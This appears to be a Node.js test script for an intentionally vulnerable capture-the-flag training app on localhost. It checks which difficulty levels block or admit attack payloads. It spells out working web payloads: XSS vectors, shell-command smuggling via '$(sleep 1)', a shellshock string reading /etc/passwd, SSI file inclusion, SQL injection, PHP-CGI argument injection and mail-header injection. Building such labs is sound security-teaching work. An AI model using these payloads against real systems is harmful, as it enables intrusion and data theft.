const http = require("http");
function req(method, path, { cookies = "", body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = { host: "localhost", port: 3000, path, method, headers: Object.assign({}, headers, cookies ? { Cookie: cookies } : {}, data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {}) };
    const r = http.request(opts, (res) => { let c = []; res.on("data", (d) => c.push(d)); res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(c).toString(), setCookie: res.headers["set-cookie"] || [] })); });
    r.setTimeout(4000, () => r.destroy(new Error("timeout: " + method + " " + path)));
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function hasFlag(body) { return /FLAG\{[^}]+\}/.test(body); }
let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 40000).unref();

async function run() {
  // html-injection medium script-block fix
  let r = await req("GET", "/vuln/html-injection?difficulty=medium&bio=" + encodeURIComponent("<script>alert(1)</script>"));
  check("html-injection medium: <script> alone blocked -> NO flag", !hasFlag(r.body));

  // mail-header-injection baseline fix
  let r2 = await req("GET", "/vuln/mail-header-injection/send?difficulty=easy&name=Jordan&email=jordan@example.com&message=hi");
  check("mail-header-injection easy: clean input -> NO flag", !hasFlag(r2.body));
  let r3 = await req("GET", "/vuln/mail-header-injection/send?difficulty=medium&name=Jordan&email=" + encodeURIComponent("j@example.com\r\nBcc: x@evil.test") + "&message=hi");
  check("mail-header-injection medium: email field filtered -> NO flag", !hasFlag(r3.body));

  // code-injection blocked/exploited redesign
  let r4 = await req("GET", "/vuln/code-injection?difficulty=medium&formula=" + encodeURIComponent("process.version"));
  check("code-injection medium: raw 'process' blocked -> NO flag", !hasFlag(r4.body));
  let r5 = await req("GET", "/vuln/code-injection?difficulty=hard&formula=" + encodeURIComponent("'proc'+'ess'"));
  check("code-injection hard: concatenation blocked -> NO flag", !hasFlag(r5.body));
  let r5b = await req("GET", "/vuln/code-injection?difficulty=medium&formula=" + encodeURIComponent("'proc'+'ess'"));
  check("code-injection medium: concatenation still bypasses -> flag", hasFlag(r5b.body));

  // blind-command-injection separator-aware detection (short delays)
  let r6 = await req("GET", "/vuln/blind-command-injection?difficulty=medium&host=" + encodeURIComponent("10.0.0.5; sleep 1"));
  check("blind-command-injection medium: ; filtered -> NO flag", !hasFlag(r6.body));
  let r7 = await req("GET", "/vuln/blind-command-injection?difficulty=hard&host=" + encodeURIComponent("10.0.0.5 | sleep 1"));
  check("blind-command-injection hard: pipe filtered -> NO flag", !hasFlag(r7.body));
  let r7b = await req("GET", "/vuln/blind-command-injection?difficulty=hard&host=" + encodeURIComponent("10.0.0.5 $(sleep 1)"));
  check("blind-command-injection hard: $() still works -> flag", hasFlag(r7b.body));

  // ssi-injection include traversal fix
  let r8 = await req("GET", "/vuln/ssi-injection?difficulty=medium&sig=" + encodeURIComponent('<!--#include file="../../../etc/passwd" -->'));
  check("ssi-injection medium: include bypass -> flag", hasFlag(r8.body), r8.body.match(/result">[^<]*/) || "");
  let r8b = await req("GET", "/vuln/ssi-injection?difficulty=easy");
  check("ssi-injection easy: default signature still renders legit template", r8b.body.includes("Welcome to SecureCorp"));

  // header-xss live-pattern detection fix
  let r9 = await req("GET", "/vuln/header-xss?difficulty=hard&referer=" + encodeURIComponent("<img src=x onerror=alert(1)>"));
  check("header-xss hard: img/onerror blocked -> NO flag", !hasFlag(r9.body));
  let r10 = await req("GET", "/vuln/header-xss?difficulty=hard&referer=" + encodeURIComponent("<svg onbegin=alert(1)>"));
  check("header-xss hard: svg onbegin bypass -> flag", hasFlag(r10.body));

  // heartbleed-sim crash fix
  let r11 = await req("GET", "/vuln/heartbleed-sim/beat?difficulty=easy&payload=PING&payload_length=200");
  check("heartbleed-sim easy: large overread -> flag (no crash)", hasFlag(r11.body), r11.body.slice(0, 100));
  let r11b = await req("GET", "/vuln/heartbleed-sim/beat?difficulty=medium&payload=PING&payload_length=150");
  check("heartbleed-sim medium: overread -> flag", hasFlag(r11b.body));

  // shellshock naive-check polarity fix
  let r12 = await req("GET", "/vuln/shellshock/run?difficulty=medium&ua=" + encodeURIComponent("() { :; }; cat /etc/passwd"));
  check("shellshock medium: exact prefix caught -> NO flag", !hasFlag(r12.body));
  let r13 = await req("GET", "/vuln/shellshock/run?difficulty=medium&ua=" + encodeURIComponent(" () { :; }; cat /etc/passwd"));
  check("shellshock medium: leading-space bypass -> flag", hasFlag(r13.body));

  // drupageddon corrected payload
  const SQLI_KEY = "x') OR ('1'='1";
  let r14 = await req("POST", "/vuln/drupageddon/comment?difficulty=easy", { body: { name: { [SQLI_KEY]: "y" }, email: "a@b.com" } });
  check("drupageddon easy: array-key injection -> flag", hasFlag(r14.body), r14.body.slice(0, 200));
  let r15 = await req("POST", "/vuln/drupageddon/comment?difficulty=hard", { body: { name: "ok", email: "a@b.com", meta: { name: { [SQLI_KEY]: "y" } } } });
  check("drupageddon hard: nested meta.name bypass -> flag", hasFlag(r15.body), r15.body.slice(0, 200));

  // php-cgi-rce '+'-as-space fix
  let r16 = await req("GET", "/vuln/php-cgi-rce?difficulty=easy&-d+allow_url_include=1+-d+auto_prepend_file=php://input");
  check("php-cgi-rce easy: dangerous flags -> flag", hasFlag(r16.body));
  let r17 = await req("GET", "/vuln/php-cgi-rce?difficulty=hard&-d+disable_functions=+-d+safe_mode=0");
  check("php-cgi-rce hard: disable_functions bypass -> flag", hasFlag(r17.body));

  // xst hard-tier gate fix
  let rx = await req("GET", "/vuln/xst?difficulty=hard");
  let ck = (rx.setCookie.find((s) => s.startsWith("xst_authToken")) || "").split(";")[0];
  let rt = await req("TRACE", "/vuln/xst?difficulty=hard", { cookies: ck });
  check("xst hard: TRACE disabled on main path", rt.status === 404, "status=" + rt.status);
  let rt2 = await req("TRACE", "/vuln/xst/legacy?difficulty=hard", { cookies: ck });
  check("xst hard: legacy path still works -> flag", hasFlag(rt2.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}
run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
